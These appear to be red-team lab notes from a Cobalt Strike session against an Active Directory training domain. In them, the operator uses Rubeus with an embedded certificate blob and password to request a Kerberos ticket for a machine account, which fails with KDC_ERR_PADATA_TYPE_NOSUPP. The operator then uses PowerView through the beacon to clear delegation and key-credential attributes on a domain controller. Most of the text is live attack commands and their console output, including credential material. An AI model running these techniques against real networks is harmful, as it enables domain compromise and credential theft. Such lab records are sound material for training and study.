Xkxp/pejuzJGbpeTeFmt16WvNblufrpcnZk9M1NjQMDTdF+QpzsQMGf7bwtFw+FPKLmS2dhNKukIn+ewyLTGUf/QDBtEhwCbUafZBqEeDCDGN2R5V6LsdUSH2iCHhutVrtmjtiI+rqu4mMpKPxGw8aoNQPL5lrXQQl8qs25nlgGu0sa+NRTZgFkd2sm7mvvsUl3RtCKZ9aqug/CwKEsbIUM5wjD9Smui2OVBupVmypJA2nJrytOItCOz7VqkpgoYn+F78C9tuisHSuUR51LGdVXo1LpDYNyEzcqFTg2fdkJYdcLes+lhNiCnToXrIp/YB90bpEkWAeyNPfI+z9taESQbyjRY8LLr4B4CKZNVP1DHpSZexD2kFrDXoXZmXpFAFq+LxZxg0mNoHzyA7ANQOh8CrJbT5aNkdc802z7laxciPZwGg/SlXbLjwbJ59Ewjl4IVNdwmwEoKcYM8oQTgCa1oxk/SMiRAGFhdXGLNPBaWInEAHmwT1SC6QFQSw/FHSS/Qdoc10w2kNm8JNUdf+8URUwOzAfMAcGBSsOAwIaBBRCnr+SsZLcQMEXNnyl1nd0hRRD/gQUE4rjx8+jN5rfU171ipWaZgf84l8CAgfQ /password:"b2986025-cc0c-4cdc-a47c-ca0d860dd69e" /getcredentials /show


```
getting error below going to restart `dc-2` and `wkstn-2`
```

[12/11 19:33:19] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate: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 /password:"b2986025-cc0c-4cdc-a47c-ca0d860dd69e" /getcredentials /show
[12/11 19:33:24] [*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:WKSTN-2$ /certificate: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 /password:"b2986025-cc0c-4cdc-a47c-ca0d860dd69e" /getcredentials /show
[12/11 19:33:24] [+] host called home, sent: 557552 bytes
[12/11 19:33:25] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT


[12/11 19:33:26] [+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=WKSTN-2$ 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\WKSTN-2$'
[*] Using domain controller: 10.10.122.10:88

[12/11 19:33:26] [+] received output:

[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP
```


`After Restart`
import `PowerView.ps1`
```powershell
[12/11 20:40:36] beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[12/11 20:40:39] [*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[12/11 20:40:39] [+] host called home, sent: 143801 bytes
```
ensure that `msDS-AllowedToActOnBehalfOfOtherIdentity` is cleared
```powershell
[12/11 20:40:45] beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
[12/11 20:40:45] [+] host called home, sent: 10 bytes
[12/11 20:40:45] [*] Tasked beacon to run: Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity (unmanaged)
[12/11 20:40:45] [+] host called home, sent: 138048 bytes
```

```
powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-KeyCredentialLink